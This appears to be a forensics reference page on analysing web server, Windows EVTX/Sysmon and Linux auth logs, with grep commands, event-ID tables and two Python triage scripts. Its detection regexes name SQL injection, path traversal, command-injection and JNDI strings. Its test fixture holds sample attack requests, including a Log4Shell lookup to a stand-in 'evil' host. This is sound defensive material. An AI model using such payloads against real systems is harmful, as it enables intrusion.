---
title: "Log Analysis - Web Servers, Windows EVTX, auth.log and Sysmon"
category: forensics
subcategory: logs
type: technique
tags: [logs, evtx, sysmon, event-id, auth-log, access-log, apache, nginx, iis, chainsaw, hayabusa, zircolite, evtx-dump, evtxecmd, sigma, goaccess, powershell-logging, dfir, incident-response]
difficulty: medium
summary: "Grep a web access log for the compromise, and know which Windows Event IDs and Sysmon events actually answer the question."
when_to_use:
  - "You were given access.log, auth.log, or a folder of .evtx files"
  - "The question is 'when did they get in', 'what did they run', or 'what did they take'"
  - "A Sysmon or PowerShell operational log is included in the artefact bundle"
  - "You need to prove execution, lateral movement, or persistence from logs alone"
tools: [evtx_dump, EvtxECmd, chainsaw, hayabusa, zircolite, goaccess, jq, awk, journalctl, ausearch]
related: [timeline-building, disk-windows-execution-artifacts, disk-windows-registry, container-forensics]
---

## TL;DR

Web logs: one `awk` for top IPs, one grep for attack signatures, one grep for the POST that
uploaded the shell. Windows: 4624/4625 for logons, 4688 + Sysmon 1 for execution, 7045 for service
install, 4104 for PowerShell, 1102 for log clearing. Linux: `Failed password`, `Accepted`,
`session opened`, `sudo: ... COMMAND=`.

## Web server logs

### Formats

Apache **combined**:

```
1.2.3.4 - alice [15/Jan/2024:09:12:04 +0000] "GET /admin.php?id=1 HTTP/1.1" 200 5120 "https://ref/" "Mozilla/5.0 ..."
 %h    %l  %u        %t                          "%r"                      %>s  %b   "%{Referer}i"  "%{User-Agent}i"
```

nginx default is the same layout. IIS uses W3C with a `#Fields:` header line that tells you the
column order -- always read it before writing an `awk`:

```
#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
```

### The first ten commands

```sh
# 1) how big is the problem
wc -l access.log && head -1 access.log && tail -1 access.log
# 2) top source IPs
awk '{print $1}' access.log | sort | uniq -c | sort -rn | head -20
# 3) status-code histogram - a spike of 404s is a scanner, a lone 200 after them is the hit
awk '{print $9}' access.log | sort | uniq -c | sort -rn
# 4) requests per minute (spot the burst)
awk -F'[:[]' '{print $2":"$3":"$4}' access.log | uniq -c | sort -rn | head
# 5) most requested URIs
awk '{print $7}' access.log | cut -d'?' -f1 | sort | uniq -c | sort -rn | head -25
# 6) every POST - uploads and logins live here
awk '$6 ~ /POST/ {print}' access.log | head -40
# 7) the webshell hunt: a POST to a script that was uploaded earlier
grep -E 'POST .*\.(php|phtml|jsp|jspx|aspx|ashx|asp|cgi|pl)' access.log
# 8) attack signatures in the URI
grep -aiE "(union[[:space:]+]+select|' or |sleep\(|benchmark\(|information_schema|\.\./|%2e%2e|/etc/passwd|<script|onerror=|cmd=|exec\(|system\(|base64_decode|eval\(|\\\$\{jndi:)" access.log
# 9) scanner user agents
grep -aiE '"(sqlmap|nikto|nmap|dirbuster|gobuster|ffuf|wfuzz|masscan|zgrab|curl|wget|python-requests|Go-http-client|Hydra)' access.log
# 10) requests with an empty or absurd user agent
awk -F'"' '{print $6}' access.log | sort | uniq -c | sort -rn | head -20
```

### Narrowing to the incident

```sh
# everything one IP did, in order
grep '^203\.0\.113\.9 ' access.log
# a time window (Apache bracket timestamp)
awk '$4 >= "[15/Jan/2024:09:00:00" && $4 <= "[15/Jan/2024:10:00:00"' access.log
# bytes sent, largest first: the exfil response
awk '{print $10, $1, $7}' access.log | sort -rn | head -20
# status 200 responses to a URI nobody else requested
awk '$9 == 200 {print $7}' access.log | sort | uniq -c | sort -n | head -20
# rotated and compressed logs
zcat access.log.*.gz | grep 'shell.php'
zgrep -h 'shell.php' access.log.*.gz
# uniq the request lines to see the distinct attack payloads
awk -F'"' '{print $2}' access.log | sort -u | grep -i union
# interactive HTML report
goaccess -f access.log --log-format=COMBINED -o report.html
goaccess access.log --log-format=COMBINED --date-format=%d/%b/%Y --time-format=%T
# decode URL-encoded payloads so the grep matches
python3 -c "import sys,urllib.parse;[sys.stdout.write(urllib.parse.unquote_plus(l)) for l in sys.stdin]" < access.log | grep -i 'select'
```

Error logs matter too: `/var/log/apache2/error.log`, `/var/log/nginx/error.log`, PHP's
`error_log`. A PHP fatal error naming a file in `/tmp` or `/uploads` is the webshell.

## Windows Event Logs (EVTX)

### Where they live

```
C:\Windows\System32\winevt\Logs\Security.evtx
C:\Windows\System32\winevt\Logs\System.evtx
C:\Windows\System32\winevt\Logs\Application.evtx
C:\Windows\System32\winevt\Logs\Microsoft-Windows-Sysmon%4Operational.evtx
C:\Windows\System32\winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx
C:\Windows\System32\winevt\Logs\Windows PowerShell.evtx
C:\Windows\System32\winevt\Logs\Microsoft-Windows-TaskScheduler%4Operational.evtx
C:\Windows\System32\winevt\Logs\Microsoft-Windows-TerminalServices-LocalSessionManager%4Operational.evtx
C:\Windows\System32\winevt\Logs\Microsoft-Windows-TerminalServices-RemoteConnectionManager%4Operational.evtx
C:\Windows\System32\winevt\Logs\Microsoft-Windows-Windows Defender%4Operational.evtx
C:\Windows\System32\winevt\Logs\Microsoft-Windows-WMI-Activity%4Operational.evtx
C:\Windows\System32\winevt\Logs\Microsoft-Windows-Bits-Client%4Operational.evtx
```

### Parsers

```sh
# python-evtx: one XML record per event
pip install python-evtx
evtx_dump.py Security.evtx > security.xml
# the rust evtx crate is much faster and does JSONL
cargo install evtx
evtx_dump -o jsonl Security.evtx > security.jsonl
evtx_dump -o json -t 4 Security.evtx > security.json
# Eric Zimmerman's parser, CSV output with normalised columns
EvtxECmd.exe -f Security.evtx --csv . --csvf security.csv
EvtxECmd.exe -d C:\evtx --csv . --csvf all.csv
# sigma-rule hunting across a directory of evtx
chainsaw hunt ./evtx -s ./sigma --mapping ./mappings/sigma-event-logs-all.yml
chainsaw search ./evtx -e 'mimikatz' -i
chainsaw dump ./evtx/Security.evtx --json
# hayabusa: fast timeline + built-in detection rules
hayabusa csv-timeline -d ./evtx -o timeline.csv
hayabusa json-timeline -d ./evtx -o timeline.jsonl -L
hayabusa metrics -d ./evtx        # event-id counts per channel
# zircolite: sigma over evtx via a sqlite backend
python3 zircolite.py --evtx ./evtx --ruleset rules/rules_windows_sysmon.json
# native windows
Get-WinEvent -Path .\Security.evtx -FilterXPath "*[System[EventID=4624]]" | Select -First 20
Get-WinEvent -Path .\Security.evtx | Where-Object {$_.Id -eq 4688} | Format-List *
wevtutil qe Security.evtx /lf:true /f:text /c:20
wevtutil qe Security /q:"*[System[(EventID=1102)]]" /f:text
# jq over the jsonl output
jq -r 'select(.Event.System.EventID == 4624) | [.Event.System.TimeCreated."#attributes".SystemTime, .Event.EventData.Data[]?] | @tsv' security.jsonl | head
```

### Security log Event IDs that matter

| ID | Meaning | Why you care |
| --- | --- | --- |
| 4624 | Successful logon | Who, from where, **Logon Type** |
| 4625 | Failed logon | Brute force, password spray (watch the Status/Sub Status) |
| 4634 / 4647 | Logoff / user-initiated logoff | Session duration |
| 4648 | Logon with explicit credentials | `runas`, pass-the-hash tooling |
| 4672 | Special privileges assigned | Admin-equivalent logon |
| 4688 | **Process creation** | The command line, if command-line auditing is on |
| 4689 | Process exit | Pairs with 4688 |
| 4697 | Service installed | Persistence / lateral movement |
| 4698 / 4699 / 4700 / 4701 / 4702 | Scheduled task created/deleted/enabled/disabled/updated | Persistence |
| 4719 | System audit policy changed | Anti-forensics |
| 4720 | User account created | Backdoor account |
| 4722 / 4725 / 4726 | Account enabled / disabled / deleted | Account lifecycle |
| 4728 / 4732 / 4756 | Member added to global / local / universal group | Privilege escalation |
| 4738 | User account changed | Password reset, flags changed |
| 4740 | Account locked out | Brute force fallout |
| 4768 | Kerberos TGT requested (AS-REQ) | Initial domain auth |
| 4769 | Kerberos service ticket requested (TGS-REQ) | Kerberoasting (watch RC4 / encryption type 0x17) |
| 4771 | Kerberos pre-auth failed | Password guessing against a DC |
| 4776 | NTLM credential validation | Legacy auth, often lateral movement |
| 4778 / 4779 | RDP/console session reconnected / disconnected | Interactive access |
| 5140 / 5145 | Network share accessed / detailed file share access | ADMIN$, C$, IPC$ |
| 5156 / 5157 | WFP allowed / blocked a connection | Network activity without a packet capture |
| 1102 | **The security log was cleared** | Anti-forensics, always significant |

**Logon types** on 4624/4625 -- this is the field that actually tells the story:

| Type | Meaning |
| --- | --- |
| 2 | Interactive (at the keyboard) |
| 3 | Network (SMB, shares, most lateral movement) |
| 4 | Batch (scheduled task) |
| 5 | Service |
| 7 | Unlock |
| 8 | NetworkCleartext (IIS basic auth) |
| 9 | NewCredentials (`runas /netonly`) |
| 10 | RemoteInteractive (RDP) |
| 11 | CachedInteractive (cached domain creds, laptop offline) |

### System and other channels

| ID | Channel | Meaning |
| --- | --- | --- |
| 104 | System | An event log was cleared |
| 7045 | System | **A service was installed** (PsExec, Cobalt Strike, drivers) |
| 7034 / 7035 / 7036 | System | Service crashed / sent a control / changed state |
| 7040 | System | Service start type changed |
| 6005 / 6006 / 6008 | System | Event log started / stopped / unexpected shutdown |
| 1074 | System | Clean shutdown/restart with the initiating process |
| 41 | System (Kernel-Power) | Dirty shutdown |
| 4103 | PowerShell/Operational | Module/pipeline logging |
| 4104 | PowerShell/Operational | **Script block logging** -- the actual script text |
| 4105 / 4106 | PowerShell/Operational | Script block start/stop |
| 400 / 403 / 600 | Windows PowerShell | Engine lifecycle, provider start (v2 downgrade shows here) |
| 106 / 140 / 141 / 200 / 201 | TaskScheduler | Task registered / updated / deleted / action started / completed |
| 21 / 22 / 23 / 24 / 25 | TerminalServices-LocalSessionManager | RDP logon, shell start, logoff, disconnect, reconnect |
| 1149 | TerminalServices-RemoteConnectionManager | RDP authentication succeeded (source IP!) |
| 131 / 98 | RemoteDesktopServices | Connection accepted, transport listener |
| 1116 / 1117 / 1118 | Defender | Malware detected / action taken / action failed |
| 5857 / 5860 / 5861 | WMI-Activity | WMI provider started, permanent event consumer (persistence) |

### Sysmon

| ID | Event | Use |
| --- | --- | --- |
| 1 | Process creation | Command line, hashes, **ParentImage**, OriginalFileName |
| 2 | A process changed a file creation time | **Timestomping** |
| 3 | Network connection | Process-to-destination mapping |
| 4 | Sysmon service state changed | Tampering |
| 5 | Process terminated | Pairs with 1 |
| 6 | Driver loaded | Rootkits, BYOVD |
| 7 | Image loaded | DLL side-loading (watch for unsigned DLLs from user dirs) |
| 8 | CreateRemoteThread | Process injection |
| 9 | RawAccessRead | `\\.\C:` direct disk access (credential theft, anti-forensics) |
| 10 | ProcessAccess | LSASS access -> credential dumping |
| 11 | FileCreate | Dropped files |
| 12 / 13 / 14 | Registry object create-delete / value set / key-value rename | Persistence |
| 15 | FileCreateStreamHash | **Alternate data streams**, mark-of-the-web |
| 17 / 18 | Named pipe created / connected | Cobalt Strike, PsExec |
| 19 / 20 / 21 | WMI event filter / consumer / binding | WMI persistence |
| 22 | DNS query | Per-process DNS, no pcap needed |
| 23 | File delete (archived) | Recovers the deleted file |
| 25 | Process tampering | Hollowing / herpaderping |
| 26 | File delete (logged only) | Deletion without the archive |

```sh
# the highest-value single query: every process creation with its parent
hayabusa csv-timeline -d ./evtx -o t.csv && grep -i 'Sysmon 1\|4688' t.csv | head -40
# chainsaw's built-in rules cover most of the above
chainsaw hunt ./evtx --sigma ./sigma --mapping ./mappings/sigma-event-logs-all.yml --level high
# LSASS access (credential dumping) from sysmon 10
jq -r 'select(.Event.System.EventID==10) | .Event.EventData.TargetImage' sysmon.jsonl | sort | uniq -c
# every DNS query a process made
jq -r 'select(.Event.System.EventID==22) | [.Event.EventData.Image, .Event.EventData.QueryName] | @tsv' sysmon.jsonl | sort -u
# powershell script blocks, reassembled
jq -r 'select(.Event.System.EventID==4104) | .Event.EventData.ScriptBlockText' ps.jsonl
```

## Linux logs

```sh
# where they are: debian/ubuntu use auth.log, rhel/centos use secure
ls -la /var/log/{auth.log*,secure*,syslog*,messages*,wtmp,btmp,lastlog,cron*}
# successful ssh logins, with the method and source
grep -aE 'Accepted (password|publickey|keyboard-interactive)' /var/log/auth.log
# failed logins, counted per source IP
grep -a 'Failed password' /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn | head
# usernames that were tried (spray vs brute force)
grep -a 'Failed password' /var/log/auth.log | grep -oP 'for (invalid user )?\K\S+' | sort | uniq -c | sort -rn
# invalid users = the attacker is guessing account names
grep -a 'Invalid user' /var/log/auth.log | awk '{print $8, $10}' | sort | uniq -c | sort -rn
# session opens (what actually followed a successful auth)
grep -a 'session opened for user' /var/log/auth.log
# sudo usage with the exact command
grep -a 'sudo:' /var/log/auth.log | grep -oP 'USER=\S+\s+;\s+COMMAND=\K.*'
# account and group changes
grep -aE '(useradd|usermod|groupadd|passwd|chpasswd)' /var/log/auth.log
# ssh key added to an authorized_keys file (often only visible in the filesystem)
grep -a 'Accepted publickey' /var/log/auth.log | grep -oP 'RSA SHA256:\K\S+' | sort | uniq -c
# binary login records
last -f /var/log/wtmp | head -30          # successful logins
lastb -f /var/log/btmp | head -30         # failed logins
utmpdump /var/log/wtmp | head -20         # raw record dump
lastlog                                   # last login per account
# journald (systemd)
journalctl --file /var/log/journal/*/system.journal -o short-iso | head
journalctl -u ssh --since "2024-01-15 09:00" --until "2024-01-15 10:00"
journalctl _COMM=sudo -o verbose
journalctl --list-boots
# auditd, when it is enabled
ausearch -m USER_LOGIN -ts today
ausearch -m EXECVE -ts recent -i
ausearch -k my_watch_key
aureport --summary
aureport -au -i              # authentication report
# package installs (how did that binary get there?)
grep -a ' install ' /var/log/dpkg.log
zgrep -ah 'Commandline' /var/log/apt/history.log*
rpm -qa --last | head -20
# cron
grep -a CRON /var/log/syslog | head -30
cat /var/log/cron*
```

### Log-tampering tells

- A **gap** in timestamps with no corresponding shutdown event.
- `wtmp`/`btmp` that is zero bytes or much smaller than expected.
- File mtime of `auth.log` newer than its last entry.
- Security EVTX with a 1102 event, or a suspiciously small `.evtx` with a high record-id start.
- `journalctl --verify` reporting FAIL on a sealed journal.
- Missing sequence numbers in an application log that numbers its entries.
- A syslog line whose timestamp is out of order relative to its neighbours.

## Code

```python
#!/usr/bin/env python3
"""Analyse an Apache/nginx combined-format access log and rank suspicious sources.

    python3 weblog_triage.py access.log
    python3 weblog_triage.py access.log --top 30 --ip 203.0.113.9
    python3 weblog_triage.py --selftest
"""
from __future__ import annotations

import argparse
import collections
import gzip
import re
import sys
import urllib.parse
from datetime import datetime

COMBINED = re.compile(
    r'^(?P<ip>\S+)\s+(?P<ident>\S+)\s+(?P<user>\S+)\s+'
    r'\[(?P<time>[^\]]+)\]\s+'
    r'"(?P<method>[A-Z]+)\s+(?P<uri>\S*)\s*(?P<proto>[^"]*)"\s+'
    r'(?P<status>\d{3})\s+(?P<size>\S+)'
    r'(?:\s+"(?P<referer>[^"]*)"\s+"(?P<agent>[^"]*)")?')

ATTACK_PATTERNS: list[tuple[str, re.Pattern[str], int]] = [
    ("sqli", re.compile(r"(?i)(union[\s+/*]+select|information_schema|'\s*or\s*'?\d|"
                        r"sleep\(\d|benchmark\(|waitfor\s+delay|load_file\(|into\s+outfile)"), 40),
    ("lfi-traversal", re.compile(r"(?i)(\.\./|\.\.%2f|%2e%2e|/etc/passwd|/proc/self/environ|"
                                 r"c:\\windows\\win\.ini|php://filter)"), 40),
    ("xss", re.compile(r"(?i)(<script|javascript:|onerror\s*=|onload\s*=|%3cscript)"), 25),
    ("rce", re.compile(r"(?i)(;\s*(cat|ls|id|whoami|wget|curl)\b|\|\s*(sh|bash)\b|`|\$\(|"
                       r"system\(|exec\(|passthru\(|shell_exec\()"), 45),
    ("deserialisation", re.compile(r"(?i)(O:\d+:\"|rO0AB|__wakeup|phar://)"), 40),
    ("log4shell", re.compile(r"(?i)\$\{jndi:"), 50),
    ("ssti", re.compile(r"(?i)(\{\{\s*\d+\s*\*|\{\{config|\$\{\d+\*\d+\})"), 30),
    ("webshell-name", re.compile(r"(?i)/(shell|cmd|c99|r57|wso|b374k|alfa|backdoor|"
                                 r"upload|adminer)\w*\.(php|phtml|jsp|aspx|asp)"), 45),
    ("ssrf", re.compile(r"(?i)(169\.254\.169\.254|metadata\.google|file://|gopher://|dict://)"), 35),
]
SCANNER_AGENTS = re.compile(
    r"(?i)(sqlmap|nikto|nmap|acunetix|nessus|dirbuster|gobuster|feroxbuster|ffuf|wfuzz|"
    r"masscan|zgrab|nuclei|hydra|havij|python-requests|python-urllib|go-http-client|"
    r"libwww-perl|curl/|wget/|httpclient|scrapy|zmeu)")
UPLOAD_HINT = re.compile(r"(?i)/(upload|import|attach|file|media|avatar)")
SCRIPT_EXT = re.compile(r"(?i)\.(php\d?|phtml|phar|jsp|jspx|aspx?|ashx|cgi|pl|py|rb|sh)(\?|$)")


class Source:
    def __init__(self, ip: str) -> None:
        self.ip = ip
        self.hits = 0
        self.statuses: collections.Counter[int] = collections.Counter()
        self.agents: set[str] = set()
        self.methods: collections.Counter[str] = collections.Counter()
        self.attacks: collections.Counter[str] = collections.Counter()
        self.samples: list[str] = []
        self.bytes_out = 0
        self.first: str = ""
        self.last: str = ""
        self.script_200: set[str] = set()

    @property
    def score(self) -> int:
        total = sum(weight for name, weight in
                    ((n, w) for n, _, w in ATTACK_PATTERNS) if self.attacks.get(name))
        total += min(self.statuses.get(404, 0) // 10, 30)
        total += 20 if any(SCANNER_AGENTS.search(a) for a in self.agents) else 0
        total += 25 * len(self.script_200)
        total += 15 if len(self.agents) > 5 else 0
        return total


def open_log(path: str):
    if path.endswith(".gz"):
        return gzip.open(path, "rt", encoding="utf-8", errors="replace")
    return open(path, "r", encoding="utf-8", errors="replace")


def parse_time(raw: str) -> str:
    try:
        return datetime.strptime(raw.split()[0], "%d/%b/%Y:%H:%M:%S").isoformat()
    except (ValueError, IndexError):
        return raw


def analyse(path: str, only_ip: str | None = None) -> tuple[dict[str, Source], int, int]:
    sources: dict[str, Source] = {}
    total = bad = 0
    with open_log(path) as fh:
        for line in fh:
            total += 1
            m = COMBINED.match(line)
            if not m:
                bad += 1
                continue
            ip = m.group("ip")
            if only_ip and ip != only_ip:
                continue
            src = sources.setdefault(ip, Source(ip))
            src.hits += 1
            status = int(m.group("status"))
            src.statuses[status] += 1
            src.methods[m.group("method")] += 1
            agent = m.group("agent") or "-"
            src.agents.add(agent)
            size = m.group("size")
            if size.isdigit():
                src.bytes_out += int(size)
            stamp = parse_time(m.group("time"))
            src.first = src.first or stamp
            src.last = stamp

            uri = m.group("uri")
            decoded = urllib.parse.unquote_plus(uri)
            haystack = f"{decoded} {agent}"
            for name, pattern, _weight in ATTACK_PATTERNS:
                if pattern.search(haystack):
                    src.attacks[name] += 1
                    if len(src.samples) < 6:
                        src.samples.append(f"{name}: {m.group('method')} {uri[:160]}")
            if status == 200 and SCRIPT_EXT.search(uri) and m.group("method") in ("POST", "GET"):
                if m.group("method") == "POST" or UPLOAD_HINT.search(uri):
                    src.script_200.add(uri.split("?")[0])
    return sources, total, bad


def selftest() -> int:
    import os
    import tempfile
    lines = [
        '10.0.0.1 - - [15/Jan/2024:09:00:01 +0000] "GET /index.html HTTP/1.1" 200 1024 "-" "Mozilla/5.0"',
        '203.0.113.9 - - [15/Jan/2024:09:01:00 +0000] "GET /a.php?id=1%27%20UNION%20SELECT%201,2,3 HTTP/1.1" 200 300 "-" "sqlmap/1.7"',
        '203.0.113.9 - - [15/Jan/2024:09:01:01 +0000] "GET /../../etc/passwd HTTP/1.1" 403 20 "-" "sqlmap/1.7"',
        '203.0.113.9 - - [15/Jan/2024:09:02:00 +0000] "POST /uploads/shell.php HTTP/1.1" 200 90 "-" "curl/8.0"',
        '198.51.100.4 - - [15/Jan/2024:09:03:00 +0000] "GET /?x=${jndi:ldap://evil/a} HTTP/1.1" 500 0 "-" "Java/1.8"',
    ]
    fd, path = tempfile.mkstemp(suffix=".log")
    with os.fdopen(fd, "w") as fh:
        fh.write("\n".join(lines) + "\n")
    try:
        sources, total, bad = analyse(path)
        assert total == 5 and bad == 0, (total, bad)
        assert set(sources) == {"10.0.0.1", "203.0.113.9", "198.51.100.4"}, sources.keys()
        attacker = sources["203.0.113.9"]
        assert attacker.attacks["sqli"] == 1, attacker.attacks
        assert attacker.attacks["lfi-traversal"] == 1, attacker.attacks
        assert "/uploads/shell.php" in attacker.script_200, attacker.script_200
        assert attacker.score > sources["10.0.0.1"].score
        assert sources["198.51.100.4"].attacks["log4shell"] == 1
        assert sources["10.0.0.1"].score == 0, sources["10.0.0.1"].score
        assert attacker.first.startswith("2024-01-15T09:01:00")
    finally:
        os.unlink(path)
    print("self-test OK")
    return 0


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__)
    ap.add_argument("logfile", nargs="?")
    ap.add_argument("--top", type=int, default=15)
    ap.add_argument("--ip", help="only analyse this source address")
    ap.add_argument("--selftest", action="store_true")
    args = ap.parse_args()
    if args.selftest or not args.logfile:
        return selftest()

    try:
        sources, total, bad = analyse(args.logfile, args.ip)
    except FileNotFoundError:
        print(f"no such file: {args.logfile}", file=sys.stderr)
        return 1

    print(f"== {total} lines, {bad} unparsed, {len(sources)} distinct sources")
    ranked = sorted(sources.values(), key=lambda s: -s.score)
    interesting = [s for s in ranked if s.score > 0]
    print(f"\n{'score':>6} {'hits':>7} {'bytes':>12}  ip")
    for src in (interesting or ranked)[:args.top]:
        print(f"{src.score:>6} {src.hits:>7} {src.bytes_out:>12}  {src.ip}")
        print(f"        window {src.first} .. {src.last}")
        if src.attacks:
            print("        attacks: " + ", ".join(f"{k}x{v}" for k, v in src.attacks.most_common()))
        if src.script_200:
            print("        [!] 200 on script paths: " + ", ".join(sorted(src.script_200)))
        agents = [a for a in src.agents if SCANNER_AGENTS.search(a)]
        if agents:
            print("        scanner UA: " + ", ".join(sorted(agents)[:3]))
        for sample in src.samples[:3]:
            print(f"        {sample}")
    if not interesting:
        print("\nno attack signatures matched; widen the patterns or check the error log")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
```

```python
#!/usr/bin/env python3
"""Turn evtx_dump JSONL into a readable, filtered timeline.

    evtx_dump -o jsonl Security.evtx > security.jsonl
    python3 evtx_timeline.py security.jsonl --ids 4624,4625,4688,1102
    python3 evtx_timeline.py sysmon.jsonl --preset execution
    cat *.jsonl | python3 evtx_timeline.py - --preset logon
    python3 evtx_timeline.py --selftest
"""
from __future__ import annotations

import argparse
import json
import sys

LOGON_TYPES = {
    "2": "Interactive", "3": "Network", "4": "Batch", "5": "Service", "7": "Unlock",
    "8": "NetworkCleartext", "9": "NewCredentials", "10": "RemoteInteractive",
    "11": "CachedInteractive",
}
DESCRIPTIONS = {
    4624: "logon success", 4625: "logon FAILED", 4634: "logoff", 4647: "user logoff",
    4648: "explicit credentials", 4672: "special privileges", 4688: "process created",
    4689: "process exited", 4697: "service installed", 4698: "scheduled task created",
    4699: "scheduled task deleted", 4702: "scheduled task updated",
    4719: "audit policy changed", 4720: "user created", 4726: "user deleted",
    4728: "added to global group", 4732: "added to local group",
    4768: "kerberos TGT", 4769: "kerberos service ticket", 4771: "kerberos preauth failed",
    4776: "NTLM validation", 4778: "session reconnected", 4779: "session disconnected",
    5140: "share accessed", 5145: "detailed share access", 1102: "SECURITY LOG CLEARED",
    104: "event log cleared", 7045: "SERVICE INSTALLED", 7036: "service state changed",
    4104: "powershell script block", 4103: "powershell module logging",
    1149: "RDP auth succeeded", 21: "RDP logon", 23: "RDP logoff", 25: "RDP reconnect",
    1: "sysmon: process create", 2: "sysmon: file creation time changed (TIMESTOMP)",
    3: "sysmon: network connection", 7: "sysmon: image loaded",
    8: "sysmon: CreateRemoteThread", 10: "sysmon: process access (LSASS?)",
    11: "sysmon: file created", 12: "sysmon: registry key", 13: "sysmon: registry value set",
    15: "sysmon: alternate data stream", 17: "sysmon: pipe created",
    18: "sysmon: pipe connected", 22: "sysmon: dns query", 23: "sysmon: file deleted",
}
PRESETS = {
    "logon": [4624, 4625, 4634, 4647, 4648, 4672, 4776, 4768, 4769, 4771, 1149, 21, 23, 25],
    "execution": [4688, 4689, 1, 5, 4104, 4103, 7045, 4697],
    "persistence": [4697, 4698, 4699, 4702, 7045, 12, 13, 19, 20, 21],
    "antiforensics": [1102, 104, 4719, 2, 9, 4, 23, 26],
    "lateral": [4624, 4648, 5140, 5145, 4697, 7045, 17, 18],
    "all": [],
}
FIELDS_OF_INTEREST = (
    "TargetUserName", "SubjectUserName", "IpAddress", "WorkstationName", "LogonType",
    "NewProcessName", "CommandLine", "ParentProcessName", "ProcessName", "Image",
    "ParentImage", "ServiceName", "ImagePath", "ScriptBlockText", "TargetImage",
    "QueryName", "DestinationIp", "DestinationPort", "TargetObject", "Details",
    "TaskName", "ShareName", "RelativeTargetName", "Status", "SubStatus",
)


def walk(node, out: dict[str, str]) -> None:
    """Flatten the nested Event/EventData structures evtx_dump produces."""
    if isinstance(node, dict):
        for key, value in node.items():
            if isinstance(value, (dict, list)):
                walk(value, out)
            elif value not in (None, ""):
                out.setdefault(str(key), str(value))
    elif isinstance(node, list):
        for item in node:
            walk(item, out)


def extract(record: dict) -> dict[str, str] | None:
    event = record.get("Event", record)
    system = event.get("System", {})
    raw_id = system.get("EventID")
    if isinstance(raw_id, dict):
        raw_id = raw_id.get("#text", raw_id.get("Value"))
    try:
        event_id = int(raw_id)
    except (TypeError, ValueError):
        return None
    created = system.get("TimeCreated", {})
    stamp = created.get("#attributes", {}).get("SystemTime") if isinstance(created, dict) else ""
    if not stamp and isinstance(created, dict):
        stamp = created.get("SystemTime", "")
    flat: dict[str, str] = {}
    walk(event.get("EventData", {}), flat)
    walk(event.get("UserData", {}), flat)
    flat["_id"] = str(event_id)
    flat["_time"] = str(stamp or "")
    flat["_channel"] = str(system.get("Channel", ""))
    flat["_computer"] = str(system.get("Computer", ""))
    return flat


def render(rec: dict[str, str]) -> str:
    event_id = int(rec["_id"])
    bits = []
    for field in FIELDS_OF_INTEREST:
        value = rec.get(field)
        if not value or value in ("-", "0"):
            continue
        if field == "LogonType":
            value = f"{value} ({LOGON_TYPES.get(value, '?')})"
        bits.append(f"{field}={value[:200]}")
    desc = DESCRIPTIONS.get(event_id, "")
    return (f"{rec['_time']:<32} {event_id:>5}  {desc:<34} "
            f"{rec.get('_computer', ''):<18} " + "  ".join(bits))


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__)
    ap.add_argument("jsonl", nargs="?", help="evtx_dump -o jsonl output, or - for stdin")
    ap.add_argument("--ids", help="comma-separated event IDs to keep")
    ap.add_argument("--preset", choices=sorted(PRESETS), help="a named set of event IDs")
    ap.add_argument("--grep", help="only lines containing this substring (case-insensitive)")
    ap.add_argument("--count", action="store_true", help="print an event-ID histogram instead")
    ap.add_argument("--selftest", action="store_true")
    args = ap.parse_args()
    if args.selftest or not args.jsonl:
        return selftest()

    wanted: set[int] = set()
    if args.preset:
        wanted |= set(PRESETS[args.preset])
    if args.ids:
        wanted |= {int(x) for x in args.ids.split(",") if x.strip().isdigit()}

    stream = sys.stdin if args.jsonl == "-" else open(args.jsonl, "r",
                                                      encoding="utf-8", errors="replace")
    histogram: dict[int, int] = {}
    rows: list[dict[str, str]] = []
    try:
        for line in stream:
            line = line.strip()
            if not line:
                continue
            try:
                record = json.loads(line)
            except json.JSONDecodeError:
                continue
            rec = extract(record)
            if rec is None:
                continue
            event_id = int(rec["_id"])
            histogram[event_id] = histogram.get(event_id, 0) + 1
            if wanted and event_id not in wanted:
                continue
            rows.append(rec)
    finally:
        if stream is not sys.stdin:
            stream.close()

    if args.count:
        print(f"{'id':>6} {'count':>8}  description")
        for event_id, count in sorted(histogram.items(), key=lambda kv: -kv[1]):
            print(f"{event_id:>6} {count:>8}  {DESCRIPTIONS.get(event_id, '')}")
        return 0

    rows.sort(key=lambda r: r["_time"])
    needle = args.grep.lower() if args.grep else None
    shown = 0
    for rec in rows:
        line = render(rec)
        if needle and needle not in line.lower():
            continue
        print(line)
        shown += 1
    print(f"\n[+] {shown}/{sum(histogram.values())} events shown", file=sys.stderr)
    return 0


def selftest() -> int:
    sample = {
        "Event": {
            "System": {
                "EventID": 4624,
                "Channel": "Security",
                "Computer": "WS01.corp.local",
                "TimeCreated": {"#attributes": {"SystemTime": "2024-01-15T09:12:04.123Z"}},
            },
            "EventData": {
                "TargetUserName": "alice",
                "LogonType": "10",
                "IpAddress": "203.0.113.9",
                "WorkstationName": "ATTACKER",
            },
        }
    }
    rec = extract(sample)
    assert rec is not None and rec["_id"] == "4624", rec
    assert rec["TargetUserName"] == "alice"
    line = render(rec)
    assert "RemoteInteractive" in line, line
    assert "logon success" in line, line
    assert "203.0.113.9" in line, line

    nested = {"Event": {"System": {"EventID": {"#text": "7045"},
                                   "TimeCreated": {"SystemTime": "2024-01-15T10:00:00Z"}},
                        "EventData": {"Data": [{"@Name": "ServiceName", "#text": "BadSvc"},
                                               {"@Name": "ImagePath", "#text": "C:\\Temp\\x.exe"}]}}}
    rec2 = extract(nested)
    assert rec2 is not None and rec2["_id"] == "7045", rec2
    assert 7045 in PRESETS["persistence"]
    assert extract({"Event": {"System": {}}}) is None
    print("self-test OK")
    print("  " + line)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
```

## Variants & pitfalls

- **4688 without command lines is nearly useless.** The command line is only recorded when
  *Include command line in process creation events* is enabled. Sysmon 1 always has it.
- **Event IDs are per-channel.** ID 1 is "process create" in Sysmon and something completely
  different in other channels. Always record the channel with the ID.
- **Timestamps in EVTX are UTC**; web and syslog timestamps are usually local with an offset.
  Normalise before merging (see the timeline technique).
- A **cleared log** (1102/104) does not mean all is lost: `$UsnJrnl`, `$MFT`, Sysmon, the
  registry and the filesystem still have the story.
- `evtx_dump` (Rust) and `evtx_dump.py` (python-evtx) are **different tools with the same name**.
  The Rust one does JSONL; the Python one does XML.
- Syslog lines have **no year** by default. Get it from the file mtime or the surrounding
